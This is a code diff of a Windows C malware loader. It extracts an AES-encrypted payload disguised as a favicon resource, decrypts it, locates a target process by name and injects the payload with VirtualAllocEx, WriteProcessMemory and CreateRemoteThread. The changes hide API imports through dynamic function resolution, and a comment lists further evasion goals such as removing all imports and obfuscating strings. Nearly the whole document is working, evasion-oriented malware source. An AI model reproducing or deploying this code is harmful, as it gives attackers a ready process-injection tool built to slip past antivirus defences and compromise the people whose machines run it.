@@ -1,19 +1,44 @@
+// X dynamically resolve all function calls
+// - dynamically resolve GetProcAddress, GetModuleAddress
+// - remove all imports
+// - obfuscate strings (use different key)
+
 #include <windows.h>
 #include <tlhelp32.h>
 #pragma comment (lib, "advapi32")
 #include "resources.h"
 #include "helpers.h"
 
-typedef LPVOID (WINAPI * VirtualAlloc_t)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);
-typedef VOID (WINAPI * RtlMoveMemory_t)(VOID UNALIGNED *Destination, const VOID UNALIGNED *Source, SIZE_T Length);
-
 char key[] = "mysecretkeee";
 
-// Inject
-// LPVOID (WINAPI *pVirtualAllocEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
-// BOOL (WINAPI *pWriteProcessMemory)(HANDLE  hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
-// HANDLE (WINAPI *pCreateRemoteThread)(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
-// BOOL (WINAPI *pWaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);
+// Resolved functions
+typedef HRSRC (WINAPI * FindResource_t)(HMODULE hModule, LPCSTR lpName, LPCSTR lpType);
+typedef HGLOBAL (WINAPI * LoadResource_t)(HMODULE hModule, HRSRC hResInfo);
+typedef LPVOID (WINAPI * LockResource_t)(HGLOBAL hResData);
+typedef DWORD (WINAPI * SizeofResource_t)(HMODULE hModule, HRSRC hResInfo);
+typedef LPVOID (WINAPI * VirtualAlloc_t)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);
+typedef VOID (WINAPI * RtlMoveMemory_t)(VOID UNALIGNED *Destination, const VOID UNALIGNED *Source, SIZE_T Length);
+typedef LPVOID (WINAPI * OpenProcess_t)(DWORD dwDesiredAccess,BOOL bInheritHandle, DWORD dwProcessId);
+typedef VOID (WINAPI * CloseHandle_t)(HANDLE hObject);
+typedef LPVOID (WINAPI * VirtualAllocEx_t)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
+typedef BOOL (WINAPI * WriteProcessMemory_t)(HANDLE  hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
+typedef HANDLE (WINAPI * CreateRemoteThread_t)(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
+typedef BOOL (WINAPI * WaitForSingleObject_t)(HANDLE hHandle, DWORD dwMilliseconds);
+typedef HANDLE (WINAPI * CreateToolhelp32Snapshot_t)(DWORD dwFlags, DWORD th32ProcessID);
+typedef BOOL (WINAPI * Process32First_t)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
+typedef BOOL (WINAPI * Process32Next_t)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
+typedef int (WINAPI * lstrcmpiA_t)(LPCSTR lpString1, LPCSTR lpString2);
+typedef BOOL (WINAPI * CryptAcquireContextW_t)(HCRYPTPROV *phProv, LPCWSTR szContainer, LPCWSTR szProvider, DWORD dwProvType, DWORD dwFlags);
+typedef BOOL (WINAPI * CryptCreateHash_t)(HCRYPTPROV hProv, ALG_ID Algid, HCRYPTKEY hKey, DWORD dwFlags, HCRYPTHASH *phHash);
+typedef BOOL (WINAPI * CryptHashData_t)(HCRYPTHASH hHash, const BYTE *pbData, DWORD dwDataLen, DWORD dwFlags);
+typedef BOOL (WINAPI * CryptDeriveKey_t)(HCRYPTPROV hProv, ALG_ID Algid, HCRYPTHASH hBaseData, DWORD dwFlags, HCRYPTKEY *phKey);
+typedef BOOL (WINAPI * CryptDecrypt_t)(HCRYPTKEY hKey, HCRYPTHASH hHash, BOOL Final, DWORD dwFlags, BYTE *pbData, DWORD *pdwDataLen);
+typedef BOOL (WINAPI * CryptReleaseContext_t)(HCRYPTPROV hProv, DWORD dwFlags);
+typedef BOOL (WINAPI * CryptDestroyHash_t)(HCRYPTHASH hHash);
+typedef BOOL (WINAPI * CryptDestroyKey_t)(HCRYPTKEY hKey);
+
+// Globally used function
+CloseHandle_t pCloseHandle = (CloseHandle_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "CloseHandle");
 
 void XOR(char *data, size_t data_len, char *key, size_t key_len) {
 	int j;
@@ -32,20 +57,30 @@ int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keyl
     HCRYPTHASH hHash;
     HCRYPTKEY hKey;
 
-    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
+    CryptAcquireContextW_t pCryptAcquireContextW = (CryptAcquireContextW_t) hlpGetProcAddress(hlpGetModuleHandle(L"ADVAPI32.DLL"), "CryptAcquireContextW");
+    CryptCreateHash_t pCryptCreateHash = (CryptCreateHash_t) hlpGetProcAddress(hlpGetModuleHandle(L"ADVAPI32.DLL"), "CryptCreateHash");
+    CryptHashData_t pCryptHashData = (CryptHashData_t) hlpGetProcAddress(hlpGetModuleHandle(L"ADVAPI32.DLL"), "CryptHashData");
+    CryptDeriveKey_t pCryptDeriveKey = (CryptDeriveKey_t) hlpGetProcAddress(hlpGetModuleHandle(L"ADVAPI32.DLL"), "CryptDeriveKey");
+    CryptDecrypt_t pCryptDecrypt = (CryptDecrypt_t) hlpGetProcAddress(hlpGetModuleHandle(L"ADVAPI32.DLL"), "CryptDecrypt");
+    CryptReleaseContext_t pCryptReleaseContext = (CryptReleaseContext_t) hlpGetProcAddress(hlpGetModuleHandle(L"ADVAPI32.DLL"), "CryptReleaseContext");
+    CryptDestroyHash_t pCryptDestroyHash = (CryptDestroyHash_t) hlpGetProcAddress(hlpGetModuleHandle(L"ADVAPI32.DLL"), "CryptDestroyHash");
+    CryptDestroyKey_t pCryptDestroyKey = (CryptDestroyKey_t) hlpGetProcAddress(hlpGetModuleHandle(L"ADVAPI32.DLL"), "CryptDestroyKey");
+
+
+    if (!pCryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
         return -1;
     }
-    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
+    if (!pCryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
         return -1;
     }
-    if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
+    if (!pCryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
         return -1;              
     }
-    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
+    if (!pCryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
         return -1;
     }
     
-    if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *) payload, (DWORD *) &payload_len)){
+    if (!pCryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *) payload, (DWORD *) &payload_len)){
         return -1;
     }
     
@@ -61,19 +96,24 @@ int FindTarget(const char *procname) {
     HANDLE hProcSnap;
     PROCESSENTRY32 pe32;
     int pid = 0;
+
+    CreateToolhelp32Snapshot_t pCreateToolhelp32Snapshot = (CreateToolhelp32Snapshot_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "CreateToolhelp32Snapshot");
+    Process32First_t pProcess32First = (Process32First_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "Process32First");
+    Process32Next_t pProcess32Next = (Process32Next_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "Process32Next");
+    lstrcmpiA_t plstrcmpiA = (lstrcmpiA_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "lstrcmpiA");
             
-    hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    hProcSnap = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
             
     pe32.dwSize = sizeof(PROCESSENTRY32); 
             
-    if (!Process32First(hProcSnap, &pe32)) {
+    if (!pProcess32First(hProcSnap, &pe32)) {
             CloseHandle(hProcSnap);
             return 0;
     }
             
-    while (Process32Next(hProcSnap, &pe32)) {
-            if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
+    while (pProcess32Next(hProcSnap, &pe32)) {
+            if (plstrcmpiA(procname, pe32.szExeFile) == 0) {
                     pid = pe32.th32ProcessID;
                     break;
             }
@@ -90,29 +130,19 @@ int Inject(HANDLE hProc, unsigned char *payload, unsigned int payload_len) {
     HANDLE hThread = NULL;
     DWORD oldProtect = 0;
 
-	// unsigned char sVirtualAllocEx[] = { 0x3b, 0x10, 0x1, 0x11, 0x16, 0x13, 0x9, 0x35, 0x7, 0x9, 0xa, 0x6, 0x28, 0x1 };
-	// unsigned char sWriteProcessMemory[] = { 0x3a, 0xb, 0x1a, 0x11, 0x6, 0x22, 0x17, 0x1b, 0x8, 0x0, 0x16, 0x16, 0x20, 0x1c, 0x1e, 0xa, 0x11, 0xb };
-	// unsigned char sCreateRemoteThread[] = { 0x2e, 0xb, 0x16, 0x4, 0x17, 0x17, 0x37, 0x11, 0x6, 0xa, 0x11, 0x0, 0x39, 0x11, 0x1, 0x0, 0x2, 0x16 };
-	// unsigned char sWaitForSingleObject[] = { 0x3a, 0x18, 0x1a, 0x11, 0x25, 0x1d, 0x17, 0x27, 0x2, 0xb, 0x2, 0x9, 0x8, 0x36, 0x11, 0xf, 0x6, 0x11, 0x11 };
+    VirtualAllocEx_t pVirtualAllocEx = (VirtualAllocEx_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "VirtualAllocEx");
+    WriteProcessMemory_t pWriteProcessMemory = (WriteProcessMemory_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "WriteProcessMemory");
+    CreateRemoteThread_t pCreateRemoteThread = (CreateRemoteThread_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "CreateRemoteThread");
+    WaitForSingleObject_t pWaitForSingleObject = (WaitForSingleObject_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "WaitForSingleObject");
 
-	// XOR(sVirtualAllocEx, sizeof(sVirtualAllocEx), key, sizeof(key));
-	// XOR(sWriteProcessMemory, sizeof(sWriteProcessMemory), key, sizeof(key));
-	// XOR(sCreateRemoteThread, sizeof(sCreateRemoteThread), key, sizeof(key));
-	// XOR(sWaitForSingleObject, sizeof(sWaitForSingleObject), key, sizeof(key));
-
- //    pVirtualAllocEx = GetProcAddress(GetModuleHandle("kernel32.dll"), sVirtualAllocEx);
- //    pWriteProcessMemory = GetProcAddress(GetModuleHandle("kernel32.dll"), sWriteProcessMemory);
- //    pCreateRemoteThread = GetProcAddress(GetModuleHandle("kernel32.dll"), sCreateRemoteThread);
- //    pWaitForSingleObject = GetProcAddress(GetModuleHandle("kernel32.dll"), sWaitForSingleObject);
-
-    pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    WriteProcessMemory(hProc, pRemoteCode, payload, payload_len, NULL);
+    pRemoteCode = pVirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    pWriteProcessMemory(hProc, pRemoteCode, payload, payload_len, NULL);
     
-    hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE) pRemoteCode, NULL, 0, NULL);
+    hThread = pCreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE) pRemoteCode, NULL, 0, NULL);
 
     if (hThread != NULL) {
-            WaitForSingleObject(hThread, -1);
-            CloseHandle(hThread);
+            pWaitForSingleObject(hThread, -1);
+            pCloseHandle(hThread);
             return 0;
     }
     return -1;
@@ -129,20 +159,28 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
     unsigned char AESkey[] = { 0x5a, 0xdc, 0x9c, 0xd0, 0xfd, 0x9d, 0x46, 0xc1, 0xd9, 0xe, 0xea, 0x75, 0x99, 0x1d, 0xfc, 0x9 };
 
+    FindResource_t pFindResource = (FindResource_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "FindResourceA");
+    LoadResource_t pLoadResource = (LoadResource_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "LoadResource");
+    LockResource_t pLockResource = (LockResource_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "LockResource");
+    SizeofResource_t pSizeofResource = (SizeofResource_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "SizeofResource");
+    VirtualAlloc_t pVirtualAlloc = (VirtualAlloc_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "VirtualAlloc");
+    RtlMoveMemory_t pRtlMoveMemory = (RtlMoveMemory_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "RtlMoveMemory");
+    OpenProcess_t pOpenProcess = (OpenProcess_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "OpenProcess");
+
 	// Extract payload from resources section
-	res = FindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
-	resHandle = LoadResource(NULL, res);
-	payload = (unsigned char *) LockResource(resHandle);
-	payload_len = SizeofResource(NULL, res);
+	res = pFindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
+	resHandle = pLoadResource(NULL, res);
+	payload = (unsigned char *) pLockResource(resHandle);
+	payload_len = pSizeofResource(NULL, res);
 
 	// Allocate some memory buffer for payload
-	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	exec_mem = pVirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
     // Decrypt payload
     AESDecrypt((char *)payload, payload_len, (char *)AESkey, sizeof(AESkey));
 
 	// Copy payload to new memory buffer
-	RtlMoveMemory(exec_mem, payload, payload_len);
+	pRtlMoveMemory(exec_mem, payload, payload_len);
 
 	// Injecton process
 	int pid = 0;
@@ -152,13 +190,13 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
 	if (pid) {
 		// try to open target process
-		hProc = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
+		hProc = pOpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
 						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
 						FALSE, (DWORD) pid);
 
 		if (hProc != NULL) {
 			Inject(hProc, (unsigned char *)exec_mem, payload_len);
-			CloseHandle(hProc);
+			pCloseHandle(hProc);
 		}
 	}
 
